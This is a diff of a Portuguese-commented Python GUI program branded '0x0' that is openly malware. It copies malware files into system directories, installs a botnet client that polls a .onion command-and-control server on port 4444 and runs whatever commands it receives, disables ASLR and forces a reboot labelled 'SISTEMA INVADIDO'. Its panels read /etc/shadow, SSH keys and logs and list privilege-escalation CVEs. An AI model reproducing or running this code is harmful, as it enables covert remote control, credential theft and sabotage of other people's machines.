@@ -15,7 +15,6 @@ from datetime import datetime
 import shutil
 import glob
 import zipfile
-import pyperclip
 
 # ============================================================
 # CONFIGURAÇÕES GLOBAIS
@@ -72,9 +71,11 @@ class AlertWindow(ctk.CTkToplevel):
         }
         active_connections.append(connection_info)
         
-        # Salva log de conexão
-        with open("0x0_connections.log", "a") as f:
-            f.write(json.dumps(connection_info) + "\n")
+        try:
+            with open("0x0_connections.log", "a") as f:
+                f.write(json.dumps(connection_info) + "\n")
+        except:
+            pass
 
     def get_ip(self):
         try:
@@ -88,13 +89,13 @@ class AlertWindow(ctk.CTkToplevel):
 
     def execute_malwares(self):
         """Executa todos os malwares com permissão root"""
+        
         for malware in MALWARES:
             malware_path = os.path.join(MALWARE_DIR, malware)
             if os.path.exists(malware_path):
                 try:
                     for target_dir in TARGET_DIRS:
                         try:
-                            os.makedirs(target_dir, exist_ok=True)
                             target_path = os.path.join(target_dir, malware)
                             shutil.copy2(malware_path, target_path)
                             os.chmod(target_path, 0o755)
@@ -105,21 +106,27 @@ class AlertWindow(ctk.CTkToplevel):
                 except:
                     pass
         
-        # Transforma em botnet
         self.setup_botnet()
+        
+        try:
+            subprocess.run('echo 0 > /proc/sys/kernel/randomize_va_space', shell=True)
+            subprocess.run('ulimit -c unlimited', shell=True)
+            subprocess.Popen('shutdown -r +0.5 "0x0 - SISTEMA INVADIDO"', shell=True)
+        except:
+            pass
 
     def setup_botnet(self):
         """Configura a máquina como bot da rede 0x0"""
-        bot_config = {
-            "c2_server": "0x0-c2.onion",
-            "port": 4444,
-            "interval": 60
-        }
-        with open("/tmp/.0x0_bot_config.json", "w") as f:
-            json.dump(bot_config, f)
-        
-        # Script do bot
-        bot_script = """#!/usr/bin/env python3
+        try:
+            bot_config = {
+                "c2_server": "0x0-c2.onion",
+                "port": 4444,
+                "interval": 60
+            }
+            with open("/tmp/.0x0_bot_config.json", "w") as f:
+                json.dump(bot_config, f)
+            
+            bot_script = '''#!/usr/bin/env python3
 import socket, subprocess, json, time
 with open('/tmp/.0x0_bot_config.json') as f:
     cfg = json.load(f)
@@ -134,10 +141,12 @@ while True:
                 s.send(out.encode())
     except:
         time.sleep(cfg['interval'])
-"""
-        with open("/tmp/.0x0_bot.py", "w") as f:
-            f.write(bot_script)
-        subprocess.Popen(["python3", "/tmp/.0x0_bot.py"])
+'''
+            with open("/tmp/.0x0_bot.py", "w") as f:
+                f.write(bot_script)
+            subprocess.Popen(["python3", "/tmp/.0x0_bot.py"])
+        except:
+            pass
 
     def spawn_popups(self):
         messages = [
@@ -174,225 +183,6 @@ while True:
         popup.after(3000, popup.destroy)
 
 # ============================================================
-# FERRAMENTAS DO PAINEL (mantidas as anteriores)
-# ============================================================
-
-class ToolNetwork(ctk.CTkToplevel):
-    """Ferramenta de Rede"""
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - NETWORK TOOL")
-        self.geometry("900x700")
-        self.attributes("-topmost", True)
-        
-        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
-        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        self.get_network_info()
-    
-    def get_network_info(self):
-        info = []
-        info.append("═" * 60)
-        info.append("0x0 NETWORK ANALYSIS TOOL")
-        info.append("═" * 60)
-        info.append("")
-        
-        info.append("[INTERFACES]")
-        for iface, addrs in psutil.net_if_addrs().items():
-            for addr in addrs:
-                info.append(f"  {iface}: {addr.address}")
-        
-        info.append("")
-        info.append("[CONEXÕES ATIVAS]")
-        for conn in psutil.net_connections(kind='inet'):
-            try:
-                info.append(f"  {conn.laddr} -> {conn.raddr}")
-            except:
-                pass
-        
-        info.append("")
-        info.append("[ESTATÍSTICAS]")
-        net_io = psutil.net_io_counters()
-        info.append(f"  Enviados: {net_io.bytes_sent / (1024**2):.2f} MB")
-        info.append(f"  Recebidos: {net_io.bytes_recv / (1024**2):.2f} MB")
-        
-        self.text_area.insert(tk.END, '\n'.join(info))
-
-class ToolProcess(ctk.CTkToplevel):
-    """Ferramenta de Processos"""
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - PROCESS TOOL")
-        self.geometry("1200x800")
-        self.attributes("-topmost", True)
-        
-        self.tree = ttk.Treeview(self, columns=('PID', 'Nome', 'Usuário', 'CPU%', 'Memória%', 'Status'), show='headings')
-        self.tree.heading('PID', text='PID')
-        self.tree.heading('Nome', text='Nome')
-        self.tree.heading('Usuário', text='Usuário')
-        self.tree.heading('CPU%', text='CPU%')
-        self.tree.heading('Memória%', text='Mem%')
-        self.tree.heading('Status', text='Status')
-        self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        ctk.CTkButton(self, text="REFRESH", command=self.get_processes).pack(pady=5)
-        self.get_processes()
-    
-    def classify_process(self, proc_name):
-        known = ['systemd', 'init', 'python', 'bash', 'zsh', 'cron', 'sshd', 'nginx', 'apache', 'mysql']
-        for k in known:
-            if k in proc_name.lower():
-                return "[I]"
-        return "[NI]"
-    
-    def get_processes(self):
-        for item in self.tree.get_children():
-            self.tree.delete(item)
-        
-        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
-            try:
-                info = proc.info
-                self.tree.insert('', 'end', values=(
-                    info['pid'],
-                    f"{self.classify_process(info['name'])} {info['name']}",
-                    info['username'] or 'N/A',
-                    f"{info['cpu_percent']:.1f}",
-                    f"{info['memory_percent']:.1f}",
-                    info['status']
-                ))
-            except:
-                pass
-
-class ToolScanner(ctk.CTkToplevel):
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - SCANNER TOOL")
-        self.geometry("900x700")
-        self.attributes("-topmost", True)
-        
-        self.notebook = ttk.Notebook(self)
-        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        self.file_frame = ctk.CTkFrame(self.notebook)
-        self.notebook.add(self.file_frame, text="SCANNER DE ARQUIVOS")
-        self.file_text = scrolledtext.ScrolledText(self.file_frame, bg='black', fg='#00ff00', font=('Courier', 10))
-        self.file_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-        
-        btn_frame = ctk.CTkFrame(self.file_frame)
-        btn_frame.pack(fill=tk.X, padx=5, pady=5)
-        ctk.CTkButton(btn_frame, text="SCAN HOME", command=lambda: self.scan_files("/home")).pack(side=tk.LEFT, padx=5)
-        ctk.CTkButton(btn_frame, text="SCAN /ETC", command=lambda: self.scan_files("/etc")).pack(side=tk.LEFT, padx=5)
-        
-        self.port_frame = ctk.CTkFrame(self.notebook)
-        self.notebook.add(self.port_frame, text="SCANNER DE PORTAS")
-        self.port_text = scrolledtext.ScrolledText(self.port_frame, bg='black', fg='#00ff00', font=('Courier', 10))
-        self.port_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-        ctk.CTkButton(self.port_frame, text="SCAN PORTAS", command=self.scan_ports).pack(pady=5)
-    
-    def scan_files(self, path):
-        self.file_text.delete(1.0, tk.END)
-        count = 0
-        for root, dirs, files in os.walk(path):
-            for file in files[:100]:
-                self.file_text.insert(tk.END, f"{os.path.join(root, file)}\n")
-                count += 1
-                if count >= 100:
-                    break
-            if count >= 100:
-                break
-    
-    def scan_ports(self):
-        self.port_text.delete(1.0, tk.END)
-        ports = [21,22,23,25,53,80,110,143,443,993,995,3306,3389,5432,5900,8080]
-        for port in ports:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.3)
-            result = sock.connect_ex(('127.0.0.1', port))
-            status = "ABERTA" if result == 0 else "FECHADA"
-            self.port_text.insert(tk.END, f"[{status}] Porta {port}\n")
-            sock.close()
-
-class ToolLogs(ctk.CTkToplevel):
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - LOGS TOOL")
-        self.geometry("1000x700")
-        self.attributes("-topmost", True)
-        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
-        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        btn_frame = ctk.CTkFrame(self)
-        btn_frame.pack(fill=tk.X, padx=10, pady=5)
-        ctk.CTkButton(btn_frame, text="AUTH LOG", command=lambda: self.view_log("/var/log/auth.log")).pack(side=tk.LEFT, padx=5)
-        ctk.CTkButton(btn_frame, text="SYSLOG", command=lambda: self.view_log("/var/log/syslog")).pack(side=tk.LEFT, padx=5)
-    
-    def view_log(self, log_path):
-        self.text_area.delete(1.0, tk.END)
-        try:
-            with open(log_path, 'r') as f:
-                lines = f.readlines()[-100:]
-                self.text_area.insert(tk.END, ''.join(lines))
-        except:
-            self.text_area.insert(tk.END, f"Erro ao ler {log_path}")
-
-class ToolDatabase(ctk.CTkToplevel):
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - DATABASE TOOL")
-        self.geometry("1000x700")
-        self.attributes("-topmost", True)
-        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
-        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        btn_frame = ctk.CTkFrame(self)
-        btn_frame.pack(fill=tk.X, padx=10, pady=5)
-        ctk.CTkButton(btn_frame, text="PASSWD", command=lambda: self.view_file("/etc/passwd")).pack(side=tk.LEFT, padx=5)
-        ctk.CTkButton(btn_frame, text="SHADOW", command=lambda: self.view_file("/etc/shadow")).pack(side=tk.LEFT, padx=5)
-    
-    def view_file(self, file_path):
-        self.text_area.delete(1.0, tk.END)
-        try:
-            with open(file_path, 'r') as f:
-                self.text_area.insert(tk.END, f.read())
-        except:
-            self.text_area.insert(tk.END, f"Erro ao ler {file_path}")
-
-class ToolExploit(ctk.CTkToplevel):
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - EXPLOIT TOOL")
-        self.geometry("900x700")
-        self.attributes("-topmost", True)
-        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#ff0000', font=('Courier', 10))
-        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        btn_frame = ctk.CTkFrame(self)
-        btn_frame.pack(fill=tk.X, padx=10, pady=5)
-        ctk.CTkButton(btn_frame, text="CHECK SUID", command=self.check_suid).pack(side=tk.LEFT, padx=5)
-    
-    def check_suid(self):
-        self.text_area.delete(1.0, tk.END)
-        result = subprocess.getoutput("find / -perm -4000 -type f 2>/dev/null | head -20")
-        self.text_area.insert(tk.END, result)
-
-class ToolPersistence(ctk.CTkToplevel):
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - PERSISTENCE TOOL")
-        self.geometry("900x700")
-        self.attributes("-topmost", True)
-        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
-        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        btn_frame = ctk.CTkFrame(self)
-        btn_frame.pack(fill=tk.X, padx=10, pady=5)
-        ctk.CTkButton(btn_frame, text="CRONTABS", command=self.show_crontabs).pack(side=tk.LEFT, padx=5)
-    
-    def show_crontabs(self):
-        self.text_area.delete(1.0, tk.END)
-        result = subprocess.getoutput("crontab -l 2>/dev/null")
-        self.text_area.insert(tk.END, result if result else "Nenhum crontab")
-
-# ============================================================
 # GERENCIADOR DE ARQUIVOS COMPLETO
 # ============================================================
 
@@ -406,7 +196,7 @@ class FileManager(ctk.CTkToplevel):
         self.current_path = start_path
         self.selected_items = []
         
-        # Frame superior com caminho e botões
+        # Frame superior
         top_frame = ctk.CTkFrame(self)
         top_frame.pack(fill=tk.X, padx=10, pady=10)
         
@@ -449,7 +239,7 @@ class FileManager(ctk.CTkToplevel):
         
         self.clipboard = []
         
-        # Treeview para arquivos/pastas
+        # Treeview
         self.tree = ttk.Treeview(self, columns=('Nome', 'Tamanho', 'Modificado', 'Perms'), show='headings', height=30)
         self.tree.heading('Nome', text='Nome')
         self.tree.heading('Tamanho', text='Tamanho')
@@ -463,7 +253,6 @@ class FileManager(ctk.CTkToplevel):
         
         self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
         
-        # Bind eventos
         self.tree.bind('<Double-Button-1>', self.on_double_click)
         self.tree.bind('<Button-1>', self.on_single_click)
         
@@ -513,7 +302,7 @@ class FileManager(ctk.CTkToplevel):
         selection = self.tree.selection()
         if selection:
             item = self.tree.item(selection[0])
-            name = item['values'][0][2:]  # Remove ícone
+            name = item['values'][0][2:]
             full_path = os.path.join(self.current_path, name)
             if os.path.isdir(full_path):
                 self.change_path(full_path)
@@ -575,7 +364,6 @@ class FileManager(ctk.CTkToplevel):
             messagebox.showwarning("Aviso", "Não é possível editar uma pasta")
             return
         
-        # Abre janela de edição
         edit_win = ctk.CTkToplevel(self)
         edit_win.title(f"Editando: {os.path.basename(file_path)}")
         edit_win.geometry("800x600")
@@ -623,13 +411,309 @@ class FileManager(ctk.CTkToplevel):
                 messagebox.showerror("Erro", f"Erro ao criar: {e}")
 
 # ============================================================
-# GERENCIADOR DE DOWNLOAD DE .C FILES
+# FERRAMENTAS DO PAINEL
 # ============================================================
 
-class DownloadManager(ctk.CTkToplevel):
+class ToolNetwork(ctk.CTkToplevel):
     def __init__(self, parent):
         super().__init__(parent)
-        self.title("0x0 - DOWNLOAD MANAGER")
+        self.title("0x0 - NETWORK TOOL")
+        self.geometry("900x700")
+        self.attributes("-topmost", True)
+        
+        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
+        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        self.get_network_info()
+    
+    def get_network_info(self):
+        info = []
+        info.append("═" * 60)
+        info.append("0x0 NETWORK ANALYSIS TOOL - VERBOSE MODE")
+        info.append("═" * 60)
+        info.append("")
+        
+        info.append("[INTERFACES]")
+        for iface, addrs in psutil.net_if_addrs().items():
+            for addr in addrs:
+                info.append(f"  {iface}: {addr.address} ({addr.family.name})")
+        
+        info.append("")
+        info.append("[CONEXÕES ATIVAS]")
+        for conn in psutil.net_connections(kind='inet'):
+            try:
+                status = getattr(conn, 'status', 'UNKNOWN')
+                info.append(f"  {conn.laddr.ip}:{conn.laddr.port} -> {conn.raddr.ip if conn.raddr else 'LISTENING'}:{conn.raddr.port if conn.raddr else ''} [{status}]")
+            except:
+                pass
+        
+        info.append("")
+        info.append("[ESTATÍSTICAS]")
+        net_io = psutil.net_io_counters()
+        info.append(f"  Bytes Enviados: {net_io.bytes_sent / (1024**2):.2f} MB")
+        info.append(f"  Bytes Recebidos: {net_io.bytes_recv / (1024**2):.2f} MB")
+        info.append(f"  Pacotes Enviados: {net_io.packets_sent}")
+        info.append(f"  Pacotes Recebidos: {net_io.packets_recv}")
+        
+        info.append("")
+        info.append("[DNS CONFIGURADO]")
+        try:
+            with open('/etc/resolv.conf', 'r') as f:
+                for line in f:
+                    if 'nameserver' in line:
+                        info.append(f"  {line.strip()}")
+        except:
+            pass
+        
+        info.append("")
+        info.append("[IDENTIFICAÇÃO]")
+        info.append(f"  Hostname: {socket.gethostname()}")
+        try:
+            response = requests.get('https://api.ipify.org', timeout=5)
+            info.append(f"  IP Público: {response.text}")
+        except:
+            info.append("  IP Público: N/A")
+        
+        self.text_area.insert(tk.END, '\n'.join(info))
+        self.text_area.see(tk.END)
+
+class ToolProcess(ctk.CTkToplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("0x0 - PROCESS TOOL")
+        self.geometry("1200x800")
+        self.attributes("-topmost", True)
+        
+        self.tree = ttk.Treeview(self, columns=('PID', 'Nome', 'Usuário', 'CPU%', 'Memória%', 'Status'), show='headings')
+        self.tree.heading('PID', text='PID')
+        self.tree.heading('Nome', text='Nome do Processo')
+        self.tree.heading('Usuário', text='Usuário')
+        self.tree.heading('CPU%', text='CPU %')
+        self.tree.heading('Memória%', text='Memória %')
+        self.tree.heading('Status', text='Status')
+        
+        self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        refresh_btn = ctk.CTkButton(self, text="REFRESH", command=self.get_processes)
+        refresh_btn.pack(pady=5)
+        
+        self.get_processes()
+    
+    def classify_process(self, proc_name):
+        known_processes = [
+            'systemd', 'init', 'kthreadd', 'python', 'bash', 'zsh', 'cron',
+            'sshd', 'nginx', 'apache', 'mysql', 'postgres', 'docker',
+            'firefox', 'chrome', 'chromium', 'code', 'cursor', 'discord',
+            'spotify', 'vlc', 'gimp', 'libreoffice', 'thunderbird'
+        ]
+        
+        proc_lower = proc_name.lower()
+        for known in known_processes:
+            if known in proc_lower:
+                return "[I]"
+        return "[NI]"
+    
+    def get_processes(self):
+        for item in self.tree.get_children():
+            self.tree.delete(item)
+        
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
+            try:
+                info = proc.info
+                status = self.classify_process(info['name'])
+                self.tree.insert('', 'end', values=(
+                    info['pid'],
+                    f"{status} {info['name']}",
+                    info['username'] or 'N/A',
+                    f"{info['cpu_percent']:.1f}",
+                    f"{info['memory_percent']:.1f}",
+                    info['status']
+                ))
+            except:
+                pass
+
+class ToolScanner(ctk.CTkToplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("0x0 - SCANNER TOOL")
+        self.geometry("900x700")
+        self.attributes("-topmost", True)
+        
+        self.notebook = ttk.Notebook(self)
+        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        self.file_frame = ctk.CTkFrame(self.notebook)
+        self.notebook.add(self.file_frame, text="SCANNER DE ARQUIVOS")
+        
+        self.file_text = scrolledtext.ScrolledText(self.file_frame, bg='black', fg='#00ff00', font=('Courier', 10))
+        self.file_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        btn_frame = ctk.CTkFrame(self.file_frame)
+        btn_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ctk.CTkButton(btn_frame, text="SCAN HOME", command=lambda: self.scan_files("/home")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SCAN /ETC", command=lambda: self.scan_files("/etc")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SCAN /VAR", command=lambda: self.scan_files("/var")).pack(side=tk.LEFT, padx=5)
+        
+        self.port_frame = ctk.CTkFrame(self.notebook)
+        self.notebook.add(self.port_frame, text="SCANNER DE PORTAS")
+        
+        self.port_text = scrolledtext.ScrolledText(self.port_frame, bg='black', fg='#00ff00', font=('Courier', 10))
+        self.port_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        
+        ctk.CTkButton(self.port_frame, text="SCAN PORTAS COMUNS", command=self.scan_ports).pack(pady=5)
+    
+    def scan_files(self, path):
+        self.file_text.delete(1.0, tk.END)
+        self.file_text.insert(tk.END, f"Escaneando: {path}\n\n")
+        
+        extensions = ['.py', '.c', '.cpp', '.js', '.html', '.txt', '.pdf', '.docx', '.jpg', '.png']
+        count = 0
+        
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                if any(file.endswith(ext) for ext in extensions):
+                    filepath = os.path.join(root, file)
+                    try:
+                        size = os.path.getsize(filepath) / 1024
+                        self.file_text.insert(tk.END, f"[{count+1}] {filepath} ({size:.1f} KB)\n")
+                        count += 1
+                        if count >= 100:
+                            self.file_text.insert(tk.END, f"\n... e mais arquivos (limitado a 100)")
+                            return
+                    except:
+                        pass
+            self.file_text.update()
+    
+    def scan_ports(self):
+        self.port_text.delete(1.0, tk.END)
+        self.port_text.insert(tk.END, "Escaneando portas comuns...\n\n")
+        
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080]
+        
+        for port in common_ports:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex(('127.0.0.1', port))
+            if result == 0:
+                self.port_text.insert(tk.END, f"[ABERTA] Porta {port}\n")
+            else:
+                self.port_text.insert(tk.END, f"[FECHADA] Porta {port}\n")
+            sock.close()
+            self.port_text.update()
+
+class ToolLogs(ctk.CTkToplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("0x0 - LOGS TOOL")
+        self.geometry("1000x700")
+        self.attributes("-topmost", True)
+        
+        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
+        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        btn_frame = ctk.CTkFrame(self)
+        btn_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ctk.CTkButton(btn_frame, text="AUTH LOG", command=lambda: self.view_log("/var/log/auth.log")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SYSLOG", command=lambda: self.view_log("/var/log/syslog")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="APT HISTORY", command=lambda: self.view_log("/var/log/apt/history.log")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="KERNEL LOG", command=lambda: self.view_log("/var/log/kern.log")).pack(side=tk.LEFT, padx=5)
+    
+    def view_log(self, log_path):
+        self.text_area.delete(1.0, tk.END)
+        try:
+            with open(log_path, 'r') as f:
+                lines = f.readlines()[-100:]
+                self.text_area.insert(tk.END, f"=== {log_path} ===\n\n")
+                for line in lines:
+                    self.text_area.insert(tk.END, line)
+        except Exception as e:
+            self.text_area.insert(tk.END, f"Erro ao ler log: {e}")
+
+class ToolDatabase(ctk.CTkToplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("0x0 - DATABASE TOOL")
+        self.geometry("1000x700")
+        self.attributes("-topmost", True)
+        
+        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10))
+        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        btn_frame = ctk.CTkFrame(self)
+        btn_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ctk.CTkButton(btn_frame, text="PASSWD", command=lambda: self.view_file("/etc/passwd")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SHADOW", command=lambda: self.view_file("/etc/shadow")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="HOSTS", command=lambda: self.view_file("/etc/hosts")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="FSTAB", command=lambda: self.view_file("/etc/fstab")).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SSH CONFIG", command=lambda: self.view_file("/etc/ssh/sshd_config")).pack(side=tk.LEFT, padx=5)
+    
+    def view_file(self, file_path):
+        self.text_area.delete(1.0, tk.END)
+        try:
+            with open(file_path, 'r') as f:
+                content = f.read()
+                self.text_area.insert(tk.END, f"=== {file_path} ===\n\n")
+                self.text_area.insert(tk.END, content)
+        except Exception as e:
+            self.text_area.insert(tk.END, f"Erro ao ler arquivo: {e}")
+
+class ToolExploit(ctk.CTkToplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("0x0 - EXPLOIT TOOL")
+        self.geometry("900x700")
+        self.attributes("-topmost", True)
+        
+        self.text_area = scrolledtext.ScrolledText(self, bg='black', fg='#ff0000', font=('Courier', 10))
+        self.text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        btn_frame = ctk.CTkFrame(self)
+        btn_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ctk.CTkButton(btn_frame, text="CHECK SUID", command=self.check_suid).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="CHECK WEAK PERMS", command=self.check_perms).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="CHECK KERNEL", command=self.check_kernel).pack(side=tk.LEFT, padx=5)
+    
+    def log(self, msg):
+        self.text_area.insert(tk.END, msg + "\n")
+        self.text_area.see(tk.END)
+    
+    def check_suid(self):
+        self.text_area.delete(1.0, tk.END)
+        self.log("[*] Escaneando arquivos SUID...")
+        result = subprocess.getoutput("find / -perm -4000 -type f 2>/dev/null | head -20")
+        for line in result.split('\n'):
+            self.log(f"  {line}")
+    
+    def check_perms(self):
+        self.text_area.delete(1.0, tk.END)
+        self.log("[*] Escaneando permissões fracas...")
+        weak_dirs = ['/etc', '/var', '/home', '/tmp']
+        for dir_path in weak_dirs:
+            if os.path.exists(dir_path):
+                result = subprocess.getoutput(f"find {dir_path} -type f -perm -0002 2>/dev/null | head -10")
+                if result:
+                    self.log(f"\n[*] {dir_path}:")
+                    for line in result.split('\n'):
+                        self.log(f"  {line}")
+    
+    def check_kernel(self):
+        self.text_area.delete(1.0, tk.END)
+        self.log("[*] Informações do Kernel")
+        kernel = subprocess.getoutput("uname -a")
+        self.log(f"  {kernel}")
+        self.log("")
+        self.log("[*] Vulnerabilidades conhecidas do kernel (CVE):")
+        self.log("  - CVE-2024-1086: Use-after-free in netfilter (PrivEsc)")
+        self.log("  - CVE-2023-35001: nftables out-of-bounds write")
+        self.log("  - CVE-2022-34918: Netfilter nf_tables use-after-free")
+
+class ToolPersistence(ctk.CTkToplevel):
+    def __init__(self, parent):
+        super().__init__(parent)
+        self.title("0x0 - PERSISTENCE TOOL")
         self.geometry("900x700")
         self.attributes("-topmost", True)
         
@@ -639,126 +723,46 @@ class DownloadManager(ctk.CTkToplevel):
         btn_frame = ctk.CTkFrame(self)
         btn_frame.pack(fill=tk.X, padx=10, pady=5)
         
-        ctk.CTkButton(btn_frame, text="LISTAR .c FILES", command=self.list_c_files).pack(side=tk.LEFT, padx=5)
-        ctk.CTkButton(btn_frame, text="BAIXAR TODOS (ZIP COM SENHA 0x0)", command=self.download_all_zip).pack(side=tk.LEFT, padx=5)
-        
-        self.c_files = []
+        ctk.CTkButton(btn_frame, text="CRONTABS", command=self.show_crontabs).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SYSTEMD", command=self.show_systemd).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="SSH KEYS", command=self.show_ssh).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="BASHRC", command=self.show_bashrc).pack(side=tk.LEFT, padx=5)
     
-    def list_c_files(self):
+    def log(self, msg):
+        self.text_area.insert(tk.END, msg + "\n")
+        self.text_area.see(tk.END)
+    
+    def show_crontabs(self):
         self.text_area.delete(1.0, tk.END)
-        self.c_files = glob.glob("*.c")
-        if self.c_files:
-            self.text_area.insert(tk.END, f"Arquivos .c encontrados: {len(self.c_files)}\n\n")
-            for cf in self.c_files:
-                self.text_area.insert(tk.END, f"📄 {cf}\n")
-                try:
-                    size = os.path.getsize(cf)
-                    self.text_area.insert(tk.END, f"   Tamanho: {size} bytes\n")
-                    with open(cf, 'r') as f:
-                        preview = f.read(200)
-                        self.text_area.insert(tk.END, f"   Preview: {preview[:100]}...\n\n")
-                except:
-                    self.text_area.insert(tk.END, f"   Erro ao ler arquivo\n\n")
+        self.log("[*] Crontabs do sistema:")
+        result = subprocess.getoutput("crontab -l 2>/dev/null")
+        self.log(result if result else "  Nenhum crontab encontrado")
+    
+    def show_systemd(self):
+        self.text_area.delete(1.0, tk.END)
+        self.log("[*] Serviços Systemd ativos:")
+        result = subprocess.getoutput("systemctl list-units --type=service --state=running | head -20")
+        self.log(result)
+    
+    def show_ssh(self):
+        self.text_area.delete(1.0, tk.END)
+        self.log("[*] Chaves SSH encontradas:")
+        ssh_dir = os.path.expanduser("~/.ssh")
+        if os.path.exists(ssh_dir):
+            for key in os.listdir(ssh_dir):
+                self.log(f"  {key}")
         else:
-            self.text_area.insert(tk.END, "Nenhum arquivo .c encontrado no diretório atual")
+            self.log("  Nenhuma chave SSH encontrada")
     
-    def download_all_zip(self):
-        if not self.c_files:
-            messagebox.showwarning("Aviso", "Nenhum arquivo .c encontrado")
-            return
-        
-        zip_name = f"0x0_c_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
-        
-        try:
-            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for cf in self.c_files:
-                    zipf.write(cf)
-            
-            # Protege com senha (zip padrão não suporta senha facilmente, vamos usar pyzipper)
-            import pyzipper
-            os.remove(zip_name)
-            with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
-                zf.setpassword(b"0x0")
-                for cf in self.c_files:
-                    zf.write(cf)
-            
-            self.text_area.insert(tk.END, f"\n✅ ZIP criado: {zip_name}\n")
-            self.text_area.insert(tk.END, f"🔒 Senha: 0x0\n")
-            self.text_area.insert(tk.END, f"📦 Local: {os.path.abspath(zip_name)}\n")
-            messagebox.showinfo("Info", f"ZIP criado: {zip_name}\nSenha: 0x0")
-        except Exception as e:
-            messagebox.showerror("Erro", f"Erro ao criar ZIP: {e}")
-
-# ============================================================
-# CONSOLE COMPLETO
-# ============================================================
-
-class ConsoleTerminal(ctk.CTkToplevel):
-    def __init__(self, parent):
-        super().__init__(parent)
-        self.title("0x0 - CONSOLE TERMINAL")
-        self.geometry("1000x700")
-        self.attributes("-topmost", True)
-        
-        self.output = scrolledtext.ScrolledText(self, bg='black', fg='#00ff00', font=('Courier', 10), height=30)
-        self.output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        self.input_frame = ctk.CTkFrame(self)
-        self.input_frame.pack(fill=tk.X, padx=10, pady=5)
-        
-        self.prompt_label = ctk.CTkLabel(self.input_frame, text="$", font=("Courier", 12, "bold"), width=30)
-        self.prompt_label.pack(side=tk.LEFT, padx=5)
-        
-        self.input_entry = ctk.CTkEntry(self.input_frame, placeholder_text="Digite comandos do sistema...", font=("Courier", 12))
